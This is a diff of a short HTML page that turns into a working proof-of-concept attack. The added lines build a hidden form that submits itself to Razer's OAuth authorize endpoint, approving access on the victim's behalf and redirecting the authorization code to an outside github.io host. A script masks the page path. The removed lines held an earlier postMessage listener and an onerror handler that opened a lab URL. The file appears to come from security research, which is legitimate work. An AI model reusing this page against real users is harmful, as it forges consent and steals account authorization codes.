@@ -1,9 +1,12 @@
-<!DOCTYPE html>
 <html>
-<body>
-   <script>
-    window.addEventListener("message", function(event){console.log(event.data);}, false);
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://oauth2.razer.com/authorize_openid?response_type=code&l=en&scope=openid+profile&client_id=e1f2f3ff90756c533e88251cda42e2ef5a770e92&state=aaa&redirect_uri=https://butanenacho.github.io" method="POST">
+      <input type="hidden" name="authorized" value="AUTHORIZE" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
     </script>
-   <img src=x onerror="window.open('http://ptl-887b28a4-4f0bc94a.libcurl.so/key/0')">
-</body>
+  </body>
 </html>
